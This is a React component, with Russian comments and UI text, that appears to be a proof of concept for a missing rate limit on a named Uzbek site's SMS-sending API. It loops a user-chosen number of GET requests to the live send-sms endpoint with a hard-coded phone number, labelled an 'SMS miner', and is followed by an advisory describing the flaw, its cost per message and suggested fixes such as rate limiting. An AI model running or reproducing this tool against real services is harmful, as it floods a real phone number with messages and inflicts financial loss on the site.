import React, { useState } from 'react';
import axios from 'axios';
import Cookies from 'js-cookie';
import { toast } from 'react-toastify';
import Logo from '../pages/himarket.png';
import { Link, useNavigate } from 'react-router-dom';

const YourComponent = () => {
  const [response, setResponse] = useState(null);
  const [repeatCount, setRepeatCount] = useState(1); // Добавили state для хранения числа повторений
  const [data, SetData] = useState([])

  const handleButtonClick = async () => {
    try {
  
        // URL, куда вы хотите отправить POST-запрос
        const apiUrl = 'https://api.client.rizomulk.uz/api/v1/account/send-sms?phone=905391575';
  
        
  
        // Опции запроса, включая Bearer Token Authorization
        const config = {
          headers: {
            'Content-Type': 'application/json',
          },
        };
  
        // Цикл for для повторения запросов в соответствии с введенным числом
        for (let index = 0; index < repeatCount; index++) {
          const response = await axios.get(apiUrl, config);
  
          // Обработка успешного ответа
          setResponse(response.data);
          toast.success(`${response.data.description}: ${index + 1}`);
        }
      } catch (error) {
        // Обработка ошибок
        toast.error('Ошибка при отправке запроса!');
      }
  };

  const handleInputChange = (event) => {
    setRepeatCount(parseInt(event.target.value, 10));
  };

  return (
    <>
    <div className="flex min-h-full flex-1 flex-col justify-center py-12 sm:px-6 lg:px-8">
      <Link to="/" className="sm:mx-auto sm:w-full sm:max-w-md">
        <img className="mx-auto h-10 w-auto" src={Logo} alt="Your Company" />
        <p className="mt-6 text-center text-2xl font-bold leading-9 tracking-tight text-gray-500">
          <a className="text-gray-900">Sms майнер</a>
        </p>
      </Link>

      <div className="mt-10 sm:mx-auto sm:w-full sm:max-w-[480px]">
        <div className="bg-white px-6 py-12 sm:shadow shadow-none sm:rounded-lg sm:px-12">
        <div>

      <div>
            <label htmlFor="username" className="block text-sm font-medium leading-6 text-gray-900">
            Введите число повторений:
            </label>
            <div className="mt-2">
                <input id="username" name="username" type="text"
                    required
                    value={repeatCount}
                    onChange={handleInputChange} 
                    className=" block w-full rounded-md border-0 p-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-gray-600 sm:text-sm sm:leading-6" />
            </div>
        </div>

      <button className=' mt-5 bg-indigo-900 w-full p-4 rounded-lg text-middle text-white' onClick={handleButtonClick}>Отправить POST-запрос</button>
        
            </div>
        </div>
      </div>
    </div>
    <div className="max-w-7xl mx-auto p-8 my-8">
      <h2 className="text-2xl font-bold mb-4">Уязвимость отправки SMS без ограничений</h2>
      
      <p className="mb-4">
        На сайте rizomulk.uz обнаружена уязвимость, позволяющая отправлять SMS-сообщения на номера телефонов без ограничений,
        что может привести к серьезным финансовым последствиям. Уязвимость проявляется при использовании следующего запроса:
      </p>

      <code className="bg-gray-100 p-2 rounded-md mb-2 inline-block">
        GET https://api.client.rizomulk.uz/api/v1/account/send-sms?phone=905391575
      </code>

      <p className="mb-4">
        Этот запрос позволяет злоумышленнику отправлять SMS-сообщения бесконечно на произвольные номера телефонов,
        что может привести к значительным финансовым потерям из-за стоимости SMS (50 sum за каждое сообщение).
      </p>

      <h3 className="text-xl font-bold mt-6 mb-2">Потенциальные последствия уязвимости</h3>
      <ul className="list-disc pl-8 mb-4">
        <li>Большие затраты на SMS-сообщения, что может привести к значительным финансовым убыткам.</li>
        <li>Возможность злоумышленникам злоупотреблять уязвимостью для создания негативного опыта пользователей.</li>
        <li>Угроза безопасности финансового бюджета сайта rizomulk.uz.</li>
      </ul>

      <h3 className="text-xl font-bold mt-6 mb-2">Как исправить уязвимость</h3>
      <p className="mb-4">
        Для устранения уязвимости необходимо внедрить ограничения на количество SMS-сообщений, которые могут быть отправлены
        с одного номера телефона в определенный период времени. Также рекомендуется использовать коды номеров, начинающихся с:
        Ucell GSM (+998 93), Ucell GSM (+998 94), Ucell GSM (+998 50), и eskiz.uz, как ограничение для отправки SMS-сообщений.
      </p>

      <p className="mb-4">
        Дополнительные меры могут включать в себя внедрение системы мониторинга и реагирования для обнаружения аномальной активности
        и автоматической блокировки отправки SMS-сообщений в случае подозрительной активности.
      </p>

      <h3 className="text-xl font-bold mt-6 mb-2">Стили и опросы</h3>
      <ul className="list-disc pl-8">
        <li>Использовать простой и понятный язык.</li>
        <li>Подчеркивать важность безопасности и сохранения финансового бюджета.</li>
        <li>Вовлекать пользователей в опросы относительно уровня их озабоченности безопасностью.</li>
      </ul>
    </div>
    </>
  );
};

export default YourComponent;
